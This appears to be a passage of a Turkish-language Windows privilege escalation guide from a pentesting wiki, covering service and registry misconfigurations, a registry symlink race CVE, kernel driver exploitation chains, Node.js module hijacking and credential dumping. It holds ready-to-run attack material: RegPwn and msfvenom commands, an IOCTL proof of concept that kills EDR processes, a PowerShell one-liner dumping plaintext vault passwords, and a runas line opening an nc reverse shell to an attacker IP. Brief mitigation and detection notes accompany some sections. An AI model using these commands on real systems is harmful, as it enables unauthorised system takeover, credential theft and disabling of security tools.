get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** gruplarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, service tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Keyfi HKLM değer yazımı için Registry symlink race (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** process'i tarafından bir HKLM session key'ine kopyalanan kullanıcı başına **ATConfig** key'leri oluşturur. Bir Registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM path'ine** yönlendirebilir ve keyfi bir HKLM **value write** primitive'i sağlar.

Key konumları (örnek: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü Accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı tarafından kontrol edilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, logon/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz değeri **HKCU ATConfig** içine yerleştirin.
2. Secure-desktop copy işlemini tetikleyin (ör. **LockWorkstation**); bu işlem AT broker flow'u başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirerek **race'i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** key'ini korumalı bir HKLM target'ına yönlendiren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilmiş HKLM path'ine yazar.

Keyfi HKLM value write elde ettikten sonra service configuration değerlerini üzerine yazarak LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir service seçin (ör. **`msiserver`**) ve yazma işleminden sonra service'i tetikleyin. **Note:** public exploit implementation, race'in bir parçası olarak **workstation'ı kilitler**.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, bu **buradan alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services söz konusu olduğunda bu, **arbitrary code çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın path'i tırnak işaretleri içinde değilse Windows, boşluktan önceki her sonlandırmayı çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ path'i için Windows şunları çalıştırmayı deneyecektir:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir servis binary'si oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir service başarısız olduğunda gerçekleştirilecek eylemleri belirtmenize olanak tanır. Bu özellik, bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**binary'lerin izinlerini** (belki birini üzerine yazabilir ve privilege escalation gerçekleştirebilirsiniz) ve klasörlerin izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için herhangi bir config dosyasını değiştirebildiğinizi veya bir Administrator hesabı tarafından çalıştırılacak herhangi bir binary dosyayı (schedtasks) değiştirebildiğinizi kontrol edin.

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörleri altındaki tüm plugin DLL'lerini otomatik olarak yükler. Yazılabilir bir portable/kopya kurulum mevcutsa, kötü amaçlı bir plugin yerleştirmek her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilgi çekici **autoruns konumları** hakkında daha fazla bilgi edinmek üzere** **aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf garip/açığı bulunan** sürücüleri arayın.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Bir driver rastgele kernel read/write primitive'i açığa çıkarıyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), doğrudan kernel memory'den bir SYSTEM token çalarak privilege escalation gerçekleştirebilirsiniz. Adım adım tekniği burada bulabilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call'un attacker-controlled bir Object Manager path açtığı race-condition bug'larında, lookup işlemini kasıtlı olarak yavaşlatmak (max-length component'ler veya derin directory chain'leri kullanarak) pencereyi microsecond'lardan onlarca microsecond'a çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE chain'leri, ayrı ayrı zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi free eden bir **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında freed bir paged-pool allocation'ı leak eden bir **lock-release-before-copy** disclosure.

Audit ve exploitation notları:

- **Free-under-lock + cancel afterwards**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşıyorsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edebilir ve freed bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geri iletebilir.
- Freed queue object'i aynı boyutta, attacker-controlled bir paged-pool allocation ile **reclaim** edin. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve size kontrol edilebilir ve daha sonra pipe read/peek operasyonlarıyla probe edilebilir. Freed object list link'leri içeriyorsa, bunları user memory'de bulunan fake request node'larından oluşan **cyclic list** ile overwrite edin; böylece driver, orijinal list head'de sonlanmak yerine attacker-defined request structure'larını tekrar tekrar işler.
- **Predictable write'ı upgrade edin**: fake request, bookkeeping write'larda (timestamps / QPC / refcount-adjacent fields) kullanılan nested context pointer'ı redirect ediyorsa, **address-controlled but not value-controlled** bir kernel write elde edebilirsiniz. Bu durumda final code/data pointer yerine sprayed pool object'in **length/size** field'ını hedefleyin, ardından corrupted object bir **out-of-bounds paged-pool read** sağlayana kadar spray'i enumerate edin.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan herhangi bir syscall güçlü bir adaydır. Attacker copied buffer'ı büyütebiliyorsa reliability artar (örneğin serializer'ın final allocation size'ını artıran çok sayıda list/resource entry ekleyerek); çünkü daha uzun copy, makinenin crash olmasına gerek kalmadan replacement window'u genişletir.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer array'leri mükemmel disclosure target'larıdır; çünkü paged-pool size attacker-controlled'dır (`8 * regBufferCnt`) ve her element bir `_IOP_MC_BUFFER_ENTRY` için kernel pointer'dır. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i recover edin, ardından **`RegBuffers`** ve **`RegBuffersCount`** değerlerini corrupt ederek sonraki I/O ring operasyonlarının attacker-forged entry'leri tüketmesini ve arbitrary kernel read/write sağlamasını mümkün kılın. Kullanılabilir tek write size stable bir byte veriyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **overlapping unaligned writes** kullanın, bunu `VirtualAlloc` ile map edin ve forged registered-buffer array'i buraya yerleştirin.

Faydalı debugging göstergeleri:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Bozulmuş I/O ring üzerinden keyfi kernel okuma/yazma elde ettikten sonra, standart post-primitive iş akışını kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive güvenlik açıkları, deterministik yerleşimleri düzenlemenize, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata corruption durumunu kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Tam zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan kontrollü yollardan kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir Registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `RTL_QUERY_REGISTRY_DIRECT` ile `int readValue` gibi bir stack scalar'a yönlendirir. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse `EntryContext`, developer'ın beklediği türe göre değil, **gerçek** Registry type'ına göre yorumlanır.

Bu durum iki kullanışlı primitive oluşturur:

- **Confused deputy / oracle**: User-controlled absolute `\Registry\...` path, driver'ın saldırganın seçtiği key'leri sorgulamasına, return code/logs üzerinden varlık bilgisini leak etmesine ve bazen caller'ın doğrudan erişemeyeceği value'ları okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar destination, Registry value type'a bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış binary buffer olarak type-confused hale gelir.

Practical exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanılan **untrusted hive** üzerine ulaşırsa kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploitability'yi korumak için value'ları `HKCU` altında hazırlamak yerine **trusted system hive'lar içindeki attacker-writable key'leri** arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki writable descendant'ları enumerate etmek için NtObjectManager kullanın ve sandboxed context'lerden erişilebilen key'leri bulmak üzere taramayı duplicated **low-integrity** token ile yeniden çalıştırın:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4 baytlık bir `int` değişkenine 8 baytlık doğrudan yazma, komşu stack verilerini bozar ve yakındaki bir callback/function pointer'ın kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext` değerinin bir `UNICODE_STRING` işaret etmesini bekler. Kod önce attacker-controlled bir `REG_DWORD` değerini stack üzerindeki bir scalar değişkene yükler ve ardından aynı buffer'ı string read için yeniden kullanırsa attacker `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyebilir; bunun sonucunda kısmen kontrol edilen bir kernel write elde edilir.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext` adresindeki ilk `LONG` değerini signed buffer size olarak değerlendirir. Önceki bir `REG_DWORD` read, yeniden kullanılan scalar değişkende **negative** ve attacker-controlled bir değer bırakırsa sonraki `REG_BINARY` query, attacker-controlled byte'ları doğrudan komşu stack slot'larının üzerine kopyalar; bu genellikle callback-pointer overwrite için full kontrol elde etmenin en temiz yoludur.

Güçlü hunting pattern: **aynı stack variable içine, yeniden başlatmadan heterogeneous registry read gerçekleştirilmesi**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'leri için Grep kullanın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğinin kötüye kullanılması (LPE + EDR kill)

Bazı imzalı third-party driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadan, device extra component içeren bir path üzerinden açıldığında secure DACL uygulanmaz; böylece herhangi bir unprivileged user, aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Bir user device'ı açabildiğinde, driver tarafından sunulan privileged IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek ortamlarda gözlemlenen örnek yetenekler:
- Arbitrary process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser aracılığıyla SYSTEM shell).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitrary process'leri terminate etme; bu sayede user land üzerinden kernel aracılığıyla AV/EDR kill gerçekleştirilebilir.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. Process termination veya handle returns işlemine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri (access mask'leri, METHOD_*, input validation) kısıtlayın ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Savunmacılar için Detection fikirleri
- Şüpheli device name'lerinin (ör. \\ .\\amsdk*) user-mode tarafından açılmasını ve abuse göstergesi olan belirli IOCTL sequence'lerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny list'lerinizi güncel tutun.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörün içinde write permissions'a** sahipseniz, bir process tarafından yüklenen bir DLL'i hijack ederek **privileges escalate** edebilirsiniz.

PATH içindeki tüm klasörlerin permissions'larını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu check'in nasıl abuse edileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Bu, `require("foo")` gibi bare import gerçekleştiren **Node.js** ve **Electron** uygulamalarını, beklenen module **missing** olduğunda etkileyen bir **Windows uncontrolled search path** varyantıdır.

Node, her üst dizindeki `node_modules` klasörlerini kontrol ederek package'ları dizin ağacında yukarı doğru arar. Windows'ta bu arama drive root'a kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu yolları kontrol edebilir:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Eğer **düşük yetkili bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package klasörü) yerleştirip eksik dependency'yi çözümleyecek **daha yüksek yetkili bir Node/Electron process** bekleyebilir. Payload, victim process'in security context'i içinde çalışır. Bu nedenle hedef administrator olarak, elevated scheduled task/service wrapper üzerinden veya auto-started privileged desktop app olarak çalıştığında **LPE** oluşur.

Bu durum özellikle şu koşullarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlandığında
- bir third-party library `require("foo")` ifadesini `try/catch` ile sarıp hata durumunda devam ettiğinde
- bir package production build'lerinden kaldırıldığında, packaging sırasında dahil edilmediğinde veya install işlemi başarısız olduğunda
- vulnerable `require()` ana application code'u yerine dependency tree'nin derinliklerinde bulunduğunda

### Vulnerable target'ları arama

Resolution path'i kanıtlamak için **Procmon** kullanın:

- `Process Name` = hedef executable (`node.exe`, Electron app EXE'si veya wrapper process'i) ile filtreleyin
- `Path` `contains` `node_modules` ile filtreleyin
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı open işlemine odaklanın

Unpacked `.asar` dosyalarında veya application source'larında kullanılabilecek yararlı code-review pattern'leri:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon veya kaynak incelemesinden **eksik paket adını** belirleyin.
2. Henüz mevcut değilse kök arama dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Beklenen tam adla bir modül bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` girişiminde bulunur ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu kalıba uyan eksik isteğe bağlı modüllerin gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan kısım **technique**'in kendisidir: ayrıcalıklı bir Windows Node/Electron işleminin çözümleyeceği herhangi bir **missing bare import** bulun.

### Tespit ve hardening fikirleri

- Bir kullanıcının `C:\node_modules` oluşturması veya buraya yeni `.js` dosyaları/paketleri yazması durumunda uyarı üretin.
- Yüksek bütünlük düzeyine sahip işlemlerin `C:\node_modules\*` konumundan okuma yapıp yapmadığını araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodunu sessiz `try { require("...") } catch {}` kalıpları açısından inceleyin.
- Kütüphane destekliyorsa isteğe bağlı probe'ları devre dışı bırakın (örneğin bazı `ws` dağıtımları, `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` probe'undan kaçınabilir).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kurallar oluşturma, devre dışı bırakma, devre dışı bırakma...)**

[**Network enumeration için daha fazla komut burada**](../basic-cmd-for-pentesters.md#network)

### Linux için Windows Alt Sistemi (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
`bash.exe` binary'si ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda bulunabilir.

root user elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu dinlemek için ilk kez kullandığınızda, GUI üzerinden `nc` uygulamasına firewall tarafından izin verilip verilmeyeceğini sorar).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, **Windows**'un kullanıcıları **otomatik olarak oturum açtırabildiği** sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini depolar. İlk bakışta bu, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini depolayabileceği ve böylece tarayıcılar üzerinden otomatik olarak oturum açabileceği anlamına geliyor gibi görünebilir. Ancak durum böyle değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabildiği kimlik bilgilerini depolar. Bu, **bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** (sunucu veya web sitesi) **Credential Manager** & Windows Vault'tan yararlanabileceği ve kullanıcıların her seferinde kullanıcı adı ile parolayı girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynak için kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Dolayısıyla uygulamanız vault'tan yararlanmak istiyorsa, bir şekilde **credential manager ile iletişim kurmalı ve bu kaynak için kimlik bilgilerini** varsayılan depolama vault'undan istemelidir.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary dosyasını çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) kullanabileceğinizi unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları Universal Windows Platform (UWP) `PasswordVault` içinde depolar (bu alan `vaultcmd` içinde `Web Credentials` olarak da gösterilir). Bu depolama alanı oturumdan izole edilmiştir ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak decrypt edilebilir.

Depolanan tüm kullanıcı adlarını ve düz metin parolaları anında dump edip decrypt etmek için bu PowerShell komutunu kullanıcının etkin oturumu içinde çalıştırın:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcı oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

